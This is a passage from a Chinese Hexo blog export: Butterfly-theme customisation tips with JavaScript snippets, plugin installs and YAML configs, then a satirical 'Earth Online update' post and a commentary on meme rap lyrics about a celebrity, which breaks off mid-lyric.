class="string">......</span></span><br></pre></td></tr></table></figure><p>三连后日历成功显示</p><h4 id="博客背景弹窗切换">博客背景弹窗切换</h4><p><a href="https://blog.leonus.cn/2022/bg2.html" rel="external nofollow noreferrer">https://blog.leonus.cn/2022/bg2.html</a></p><h4 id="进入离开页面时修改标题">进入离开页面时修改标题</h4><p>你可能见过一些网站，当离开网页时，上方标签内标题会变成另一段文字；回到页面后标签内容再次修改，几秒后恢复。</p><p>在<code>【Blogroot】/themes/Butterfly/source/js/</code>目录下随便找个 js 文件打开（也可以自己新建），添加以下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> originTitle = <span class="variable language_">document</span>.<span class="property">title</span>;</span><br><span class="line"><span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;visibilitychange&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">hidden</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;w(ﾟДﾟ)w 不要走啊！！！ &#x27;</span> + originTitle;</span><br><span class="line">        <span class="keyword">if</span> (titleTime != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">clearTimeout</span>(titleTime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;ヾ (^▽^*))) 欢迎回来！ &#x27;</span> + originTitle;</span><br><span class="line">        titleTime = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">title</span> = originTitle;</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>新建 js 的记得在<code>_config.butterfly.yml</code>中<code>inject:</code>部分的<code>bottom:</code>后引入你新建的文件，然后 Hexo 三连即可。</p><h4 id="去掉-Pjax-与某些插件并存时地址栏的后缀">去掉 Pjax 与某些插件并存时地址栏的后缀</h4><p><a href="https://android99.com/2020/12/18/pjax-and-pwa-conflict/" rel="external nofollow noreferrer">https://android99.com/2020/12/18/pjax-and-pwa-conflict/</a></p><p>增加一段 Javascript 代码，用来劫持 Pjax 处理响应的方法。</p><p>把 request 对象中的响应地址修改为请求地址。</p><p>这里用到了 Object.defineProperty 方法，因为 request.responseURL 是只读变量，无法直接修改。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重定向浏览器地址</span></span><br><span class="line">pjax.<span class="property">site_handleResponse</span> = pjax.<span class="property">handleResponse</span>;</span><br><span class="line">pjax.<span class="property">handleResponse</span> = <span class="keyword">function</span>(<span class="params">responseText, request, href, options</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(request, <span class="string">&#x27;responseURL&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">value</span>: href</span><br><span class="line">    &#125;);</span><br><span class="line">    pjax.<span class="title function_">site_handleResponse</span>(responseText, request, href, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在【Blogroot】/source/js 目录下创建自定义 js 文件（没有文件夹的自己建一个），将以上内容写入。之后编辑<code>_config.butterfly.yml</code>，增加以下代码到 <code>inject:</code>中<code>bottom:</code>之后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bottom:</span><br><span class="line">  ...</span><br><span class="line">+ - &lt;script defer type=&quot;text/javascript&quot; src=&quot;/js/【文件名】.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="优化链接">优化链接</h4><p>Hexo 原生情况下文章链接是日期+标题的形式，这样会出现一个问题，一旦修改文章标题，原来的地址就无法访问；若使用汉字标题，复制链接时会非常难看；分级太多，对 SEO 不利。</p><p>而 abbrlink 这个插件就解决了此问题。此插件会给文章按照一定规则生成永久地址，只要文章还在，无论如何修改，原地址均可访问。</p><p>在<code>【Blogroot】</code>目录下打开 Git 执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><p>打开博客根目录下的<code>_config.yml</code>文件，找到 url 处，修改</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## URL</span></span><br><span class="line"><span class="comment">### Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">https://www.example.com</span></span><br><span class="line"><span class="comment">#permalink: :year/:month/:day/:title/</span></span><br><span class="line"><span class="comment">#permalink_defaults:</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink/</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span> <span class="comment">#support crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">dec</span>   <span class="comment">#support dec(default) and hex</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment">## Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment">## Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br></pre></td></tr></table></figure><p>hexo 三连生效</p><h4 id="自动为外链添加-nofollow-属性">自动为外链添加 nofollow 属性</h4><p><a href="https://github.com/hexojs/hexo-filter-nofollow" rel="external nofollow noreferrer">https://github.com/hexojs/hexo-filter-nofollow</a></p><p><a href="https://blog.skk.moe/post/hexo-filter-nofollow-joined-hexo-official-plugin/" rel="external nofollow noreferrer">https://blog.skk.moe/post/hexo-filter-nofollow-joined-hexo-official-plugin/</a></p><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-filter-nofollow --save</span><br></pre></td></tr></table></figure><p>如果你使用 yarn 作为你的 Hexo 的包管理器，你也可以使用下述命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add hexo-filter-nofollow</span><br></pre></td></tr></table></figure><p>选项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nofollow:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">site</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;exclude1.com&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;exclude2.com&#x27;</span></span><br></pre></td></tr></table></figure><p>enable - 是否启用插件，默认值为 true<br>field - 插件的处理范围，默认值为 site，可选 post 或 site<br>post - 仅处理文章内容<br>site - 处理全站所有页面<br>exclude - 域名白名单，不同的子域名视为不同的域名（如 www）<br><a href="http://exclude1.com" rel="external nofollow noreferrer">exclude1.com</a> 不包括 <a href="http://www.exclude1.com" rel="external nofollow noreferrer">www.exclude1.com</a> 或 <a href="http://en.exclude1.com" rel="external nofollow noreferrer">en.exclude1.com</a></p><h4 id="指定文章不在首页显示">指定文章不在首页显示</h4><p>先前看到张洪 Heo 大佬的方法，感觉不错，可惜若隐藏文章则首页文章数量也会受影响。而下文这个插件可以避免此问题。</p><p>项目地址：<a href="https://github.com/im0o/hexo-generator-index-custom" rel="external nofollow noreferrer">https://github.com/im0o/hexo-generator-index-custom</a></p><ul><li>在官方的首页生成器的基础上添加了使用 top 置顶文章和 hide 隐藏文章的功能。</li><li>hexo-generator-index-custom 可以完全替代官方的 hexojs/hexo-generator-index，所以安装之后，先卸载官方的插件，不然会引起一些冲突。</li></ul><p>在【Blogroot】下打开 Git，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-generator-index  </span><br><span class="line">npm install hexo-generator-index-custom --save</span><br></pre></td></tr></table></figure><p>在<code>_config.butterfly.yml</code>中添加如下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br><span class="line">  <span class="attr">pagination_dir:</span> <span class="string">page</span></span><br></pre></td></tr></table></figure><p>（所有的配置均与官方首页生成器一样，不必修改。）</p><p>配置完后便可使用。在文章开头的配置中添加<code>sticky</code>或<code>top</code>参数，可以置顶文章。<br>其值可以是<code>true</code>或数字，数字越大，文章排在越前面。在文章开头的配置中添加<code>hide</code>参数，可以隐藏文章。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2013/7/13 20:46:25</span><br><span class="line">sticky: 100</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2013/7/13 20:46:25</span><br><span class="line">top: 100</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2013/7/13 20:46:25</span><br><span class="line">hide: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h4 id="给文章加上密码">给文章加上密码</h4><p>项目地址：<a href="https://github.com/D0n9X1n/hexo-blog-encrypt" rel="external nofollow noreferrer">https://github.com/D0n9X1n/hexo-blog-encrypt</a><br>【快速使用。更多配置详见该项目文档】</p><blockquote><p><s>首先，这是 Hexo 生态圈中 最好的 博客加密插件</s><br>你可能需要写一些私密的博客，通过密码验证的方式让人不能随意浏览。<br>这在 wordpress, emlog 或是其他博客系统中都很容易实现，然而 hexo 除外。<code>:(</code></p></blockquote><p>为了解决这个问题，让我们有请 “hexo-blog-encrypt”.</p><p>在【Blogroot】下打开 Git，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>然后在文章开头添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line">password: hello</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>三连即可生效。高级点可以再添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password: pwd</span><br><span class="line">abstract: 有东西被加密了，请输入密码查看。</span><br><span class="line">message: 您好，这里需要密码。</span><br><span class="line">wrong_pass_message: 抱歉，这个密码看着不太对，请再试试。</span><br><span class="line">wrong_hash_message: 抱歉，这个文章不能被校验，不过您还是能看看解密后的内容。</span><br></pre></td></tr></table></figure><p>将博文头部的<code>password</code>一条删去即取消加密。</p><h4 id="博客加速-更新时弹窗提醒">博客加速/更新时弹窗提醒</h4><p><a href="https://colsrch.cn/posts/32c8ba21/" rel="external nofollow noreferrer">https://colsrch.cn/posts/32c8ba21/</a><br><a href="https://akilar.top/posts/8f31c3d0/" rel="external nofollow noreferrer">https://akilar.top/posts/8f31c3d0/</a><br>【快速使用。更多配置详见该项目文档】</p><p><code>hexo-offline-popup</code>是一个 hexo 插件， 它可加速您的 Hexo 网站的加载速度，以及网站内容更新弹窗提示。</p><p>该插件基于停止维护已久的<code>hexo-service-worker</code>插件，并在它的基础上加以改进。</p><p>在<code>【Blogroot】</code>目录下打开 Git 并输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-offline-popup --save</span><br></pre></td></tr></table></figure><p>安装后，运行以下命令激活插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate</span><br></pre></td></tr></table></figure><p>如果网站提供的所有内容来自原始服务器，你不需要添加任何配置。只需安装和运行 <code>hexo clean &amp;&amp; hexo generate</code>。如果不是，请在博客根目录的<code>_config.yml</code>中添加以下配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## offline config passed to sw-precache.</span></span><br><span class="line"><span class="attr">service_worker:</span></span><br><span class="line">  <span class="attr">maximumFileSizeToCacheInBytes:</span> <span class="number">5242880</span> <span class="comment">## 缓存的最大文件大小，以字节为单位，此处设置为 3MB。</span></span><br><span class="line">  <span class="attr">staticFileGlobs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">public/**/*.&#123;js,html,xml,css,png,jpg,gif,svg,webp,eot,ttf,woff,woff2&#125;</span></span><br><span class="line">    <span class="comment">## - public/**/*.&#123;html,xml&#125; #精简版使用这行即可</span></span><br><span class="line">  <span class="comment">## 静态文件合集，如果你的站点使用了例如 webp 格式的文件，请将文件类型添加进去。</span></span><br><span class="line">  <span class="comment">## 注意，此处的文件类型就是会缓存下来的所有文件类型，如果不需要缓存那么多，</span></span><br><span class="line">  <span class="comment">## 而只是想判断网页更新与否，缓存 html 和 xml 即可。</span></span><br><span class="line">  <span class="attr">stripPrefix:</span> <span class="string">public</span></span><br><span class="line">  <span class="attr">verbose:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">runtimeCaching:</span></span><br><span class="line">    <span class="comment">## CDNs - should be cacheFirst, since they should be used specific versions so should not change</span></span><br><span class="line">    <span class="comment">## - urlPattern: /* ## 如果你需要加载 CDN 資源，请配置该选项，如果沒有，可以不配置。</span></span><br><span class="line">    <span class="comment">##   handler: cacheFirst</span></span><br><span class="line">    <span class="comment">##   options:</span></span><br><span class="line">    <span class="comment">##     origin: example.com</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">urlPattern:</span> <span class="string">/*</span></span><br><span class="line">      <span class="attr">handler:</span> <span class="string">cacheFirst</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">origin:</span> <span class="string">cdn.jsdelivr.net</span> <span class="comment">## jsdelivr</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">urlPattern:</span> <span class="string">/*</span></span><br><span class="line">      <span class="attr">handler:</span> <span class="string">cacheFirst</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">origin:</span> <span class="string">unpkg.com</span> <span class="comment">## UNPKG</span></span><br><span class="line">    <span class="comment">## 更多 cdn 可自行参照上述格式进行配置。</span></span><br></pre></td></tr></table></figure><p>若不想再使用 hexo-offline-popup，<font color=red><strong>不可以直接删除 sw.js 等相关文件</strong></font>，由于 Service Worker 的工作原理，直接卸载会导致客户端永远无法自动获取最新页面。</p><p>解决此问题，可以安装其配套卸载插件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-offline-popup-uninstall</span><br></pre></td></tr></table></figure><p>hexo-offline-popup 暂时先留着，配置文件中相关内容也先不要动。</p><p>执行完并部署后，如果你的浏览器恰好故因为某些原因收不来更新，或是你急切地想要看到更新成果，不妨打开你的网站，Edge 浏览器则按下<code>F12</code>（或右键-&gt;<code>检查</code>）-&gt;<code>顶部+号</code>-&gt;<code>应用程序</code>-&gt;<code>Service Worker</code>，在右侧页面找到<code>注销</code>文字并点击，然后点击<code>顶部+号</code>-&gt;<code>网络</code>，随后 Ctrl+F5 强制刷新页面，等待<code>网络</code>页面中列出加载的文件。随便找一个本地加载而非 CDN 的文件并点击，进入该文件的<code>标头</code>页面，看看<code>请求方法</code>一条后面是否已经没有类似于<code>从 Service Worker 缓存</code>这样的文字，如果没有了或显示除此之外的文字，且进行 F5 刷新或浏览器左上角刷新键刷新后该文件的请求方式仍然不是从 Service Worker，则表明卸载程序生效。</p><p>如果你的客户既没能正常成功获取到更新，你又没办法告知他，那可能会比较棘手。另外，这两个插件（原版插件和 uninstall 插件）需要继续使用一段时间，不可见有效后就卸载（还是因 Service Worker 的缓存原理所致）。</p><h3 id="使用索引">使用索引</h3><h4 id="自定义侧边栏">自定义侧边栏</h4><p><a href="https://butterfly.js.org/posts/ea33ab97/" rel="external nofollow noreferrer">https://butterfly.js.org/posts/ea33ab97/</a></p><p>在 Hexo 博客目录中的<code>source/_data</code>（如果没有<code>_data</code>文件夹，请自行创建），创建一个文件<code>widget.yml</code>，填写：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">top:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">class_name:</span></span><br><span class="line">    <span class="attr">id_name:</span></span><br><span class="line">    <span class="attr">name:</span></span><br><span class="line">    <span class="attr">icon:</span></span><br><span class="line">    <span class="attr">html:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">bottom:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">class_name:</span></span><br><span class="line">    <span class="attr">id_name:</span></span><br><span class="line">    <span class="attr">name:</span></span><br><span class="line">    <span class="attr">icon:</span></span><br><span class="line">    <span class="attr">order:</span></span><br><span class="line">    <span class="attr">html:</span></span><br></pre></td></tr></table></figure><p>top: 创建的 widget 会出现在非 sticky 区域（即所有页面都会显示）</p><p>bottom: 创建的 widget 会出现在 sticky 区域（除了文章页都会显示）</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>class_name</td><td>所创建的 widget 父类 class 名 （可选）</td></tr><tr><td>id_name</td><td>所创建的 widget 父类 id 名（可选）</td></tr><tr><td>name</td><td>所创建的 widget 标题</td></tr><tr><td>icon</td><td>所创建的 widget 图标</td></tr><tr><td>order</td><td>所创建的 widget 排序 （可选）（简单来讲，就是配置数字来实现排序，如果不配置，则默认为 0。数字越小，排序越靠前。）</td></tr><tr><td>html</td><td>所创建的 widget 相关代码</td></tr></tbody></table><h4 id="标签外挂">标签外挂</h4><p><a href="https://butterfly.js.org/posts/4aa8abbe/" rel="external nofollow noreferrer">https://butterfly.js.org/posts/4aa8abbe/</a></p><h5 id="提示块标签">提示块标签</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note [class] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th>用法</th></tr></thead><tbody><tr><td>class</td><td>【可选】标识，不同的标识有不同的配色，可选 default / primary / success / info / warning / danger</td></tr><tr><td>no-icon</td><td>【可选】不显示 icon</td></tr><tr><td>style</td><td>【可选】可以覆盖配置中的 style，可选 simple/modern/flat/disabled</td></tr></tbody></table><p>备注：<code>[class]</code>不填写则为默认灰色，<code>[icon]</code>处不填写则使用默认 icon。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note info simple %&#125;</span><br><span class="line">info 提示块标签</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;</span><br><span class="line">你是刷 Visa 还是 UnionPay</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;</span><br><span class="line">前端最讨厌的浏览器</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>本文可能不定时更新。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Hexo </tag>
            
            <tag> 代码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关地球 Online 和生物的系统更新</title>
      <link href="/posts/1412730729/"/>
      <url>/posts/1412730729/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>地球 Online 检测更新：V2023.8.24.13</p><ol><li>本次更新为强制更新，升级后无法回退版本。</li><li>本次更新将重写所有底层逻辑，更新时间长。</li><li>本次海洋【新增】全新元素与新的生物和新的文明遗址。</li><li>新增【黑色海】区域，提供大量与【水】关联的趣味性玩法供玩家探索。</li><li>提升【地下室】、【盖革计数器】、【碘片】等的刷新率。</li></ol><p>生物系统检测更新：V2023.8.24.13</p><ol><li>本次更新为强制更新，升级后无法回退版本。</li><li>本次更新采取静默更新，若更新失败，我们将无法提供修复措施。</li><li>本次更新将大幅调整【DNA】组件，更多 DNA 分支静待您的探索。</li><li>本次更新将引入新组件【辐射值】且不易被观察。</li></ol><p>以上更新将分区域进行，日服更新为 2023 年 8 月 24 日，韩服与国服将于约 240 日后更新，美服将于 1200 日后获取更新。</p><p><img src="https://s2.loli.net/2023/08/25/ps6QCRJvPDXwIbB.png" alt="版本更新" title="future"></p>]]></content>
      
      
      <categories>
          
          <category> 漫谈杂言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一把来自然日卡的利剑 - 《Nayanion》</title>
      <link href="/posts/3188599471/"/>
      <url>/posts/3188599471/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>《寒冰（IGS）》一曲已然是一座新的高峰，V 在燃烧在睿站的合集《荒谬的诗》中，继此后是《扭曲（Nayanion）》一曲。强烈的说唱如同潮水一般涌入听众的耳朵，带来极强的听感体验；富恰到好处的鼓点带给听众难以言说的兴奋感。循环几次，感觉大不相同。</p><blockquote><p>“冬宫的皇帝一直嘲弄农奴的疾苦。”———这是 V 在思考中的顿悟。也许，在大雪纷飞的冬夜，只有抽点盐与冰狼才能麻痹农奴的伤痕。</p></blockquote><h3 id="正文">正文</h3><p>开场低沉的一句“LTC Has Taken the Combat Area”过后，迅速进入正文。</p><blockquote><p>理塘夜店 哥们展现帅气的背影<br>哥们艳丽素颜 像是孔雀在开屏<br>召唤高达 从理塘直接飞到东京<br>我是时代黄金 更是锐利的冰</p></blockquote><p>毫不掩饰，没有修辞，以大白话的形式直接展现丁真成名之后的浮夸心态。夜店中的背影，帅气显尽；不打扮的面孔，碾压万民；仿若飘然欲仙，飞到东京；是时代的明珠，黄金与冰。</p><p>你看丁真他真的能驾驭得了这番名气吗？很显然，以资本为推手，强求一个学历不高、说话不清的人去接受，实在有点“错位”。除了“帅气的背影”、“像是孔雀在开屏”的素颜外，又有什么过人之处呢？德不配位，从而令其产生极大的优越感。</p><blockquote><p>那些 rapper 都在装傻<br>歌词写的像跟勾八<br>哥们是瓷器真的 HipHop<br>跟做题家比我的人生像开了外挂</p></blockquote><p>接上段的“狂”继续，丁真感到其他说唱歌手的作品与自己的相比一无是处，自己是天朝（“瓷器”即 china）第一，无人可比。“跟做题家比我的人生像开了外挂”一句可谓将攻击性进行了拔高，令屏幕之外的小镇做题家们心中一惊，随机转为对丁真出名的怨气——不怪他们，也不怪丁真本人。你我这般普通的“做题家”，努力到底能不能改变命运？</p><blockquote><p>欲望和票子都无法定义我的牌面<br>吐得不是烟圈 而是来自然日卡的利剑<br>甩出我的一张名片 专业入殓<br>再给传统派们送个花圈 “I am the criminal”</p></blockquote><p>此段开始，可明显听出吐字密集程度加高，几乎没有换气时间，如行云流水般唱出。欲望与票子这种世俗的东西，配不上我的高贵，你等做题家算什么东西？吸口电子烟，吐出来自然日卡的利剑——这剑，为何出现，又刺痛了谁？“甩”字用得十分巧妙，从十多天前还在领救济物资的贫苦少年到去联合国演讲、被广大官媒包装的“明星”，这是何等大的差距？自然动作也跟着飘了起来，甚至到了给人专业入殓的地步——等等，给谁入殓，给谁的花圈？这“传统派”一词，可能是指丁真从“纯真（传统，藏族孩子）”到了“现代（出名）”后看不起“传统”的“轻狂”，也可能是暗指王源曾经抽（传统）香烟；而联系全曲，则更可能是指你我这种“小镇做题家”，靠自己努力获得成就，实在是太老土了，哪有我这种资本包装来得快？</p><blockquote><p>我给你发货 用的无人机<br>你还在刷题 耍的圆珠笔<br>我喜欢审核 因为她是烧鸡<br>裤裆里塞五根烟杆 是我的小秘密</p></blockquote><p><s>这段词我实在编不出赏析了。</s></p><blockquote><p>我在纽约开店收大米<br>卖烟弹和龙狙收入小涨一百亿<br>我的操作和我的烟杆一样硬<br>灭队了帮我拿烟 哥们是理塘收割机</p></blockquote><p>咱不说别的，就说“卖烟弹和龙狙收入小涨一百亿”这句，含义我不作直接解释。讲真，总有种听专家说“谁还每个几百万存款”时表现出的荒诞的美。此段过后，节奏上的高潮出现：</p><blockquote><p>拿烟 拿烟 拿烟 拿烟 拿烟 走上了台阶<br>拿烟 拿烟 拿烟 拿烟 拿烟 再嚼颗槟榔<br>拿烟 拿烟 拿烟 拿烟 拿烟 办场庆功宴<br>拿烟 拿烟<br>拿烟 拿烟 拿烟 拿烟 拿烟 走上了台阶<br>拿烟 拿烟 拿烟 拿烟 拿烟 吐出口浓烟<br>拿烟 拿烟 拿烟 拿烟 拿烟 再嚼颗槟榔<br>拿烟 拿烟</p></blockquote><p>走上了台阶，庆功宴，嚼槟榔，吐浓烟。飘了，实在飘了；狂，实在是狂。做题家们寒窗苦读，一日有幸出人头地，只见别人靠着资本轻松上位，你什么感受？<s>联想下以往和最近的政策和开会……停，就到这里，再说下去，必将触碰到更不可碰的滑梯（doge）。</s></p><blockquote><p>我换上了铁肺吸烟弹 像塞伯坦星人<br>你们的血汗香甜无比 是我新款的香氛<br>理塘的冬夜开了暖气还是那样的冰冷<br>我跳进了烟海里 眼里也慢慢失了神</p></blockquote><p>第二段，语速稍微放慢，语气平稳不少，也低沉了不少。但配合这段歌词，却给人一种平静叙述的感觉，仿佛这一切都是应得的。若没有资本的推手，他可能连做题家都不如；而有了推手，“你们的血汗香甜无比是我新款的香氛”，不禁让人想到“人骨搭台歌功舞，民膏研墨颂德词”。理塘的冬夜，在电子烟中，迷失了自己，再难找回自己的纯真。</p><blockquote><p>在烟雾 呼出的间隙中比个中指<br>我天天抽烟 骑着珍珠 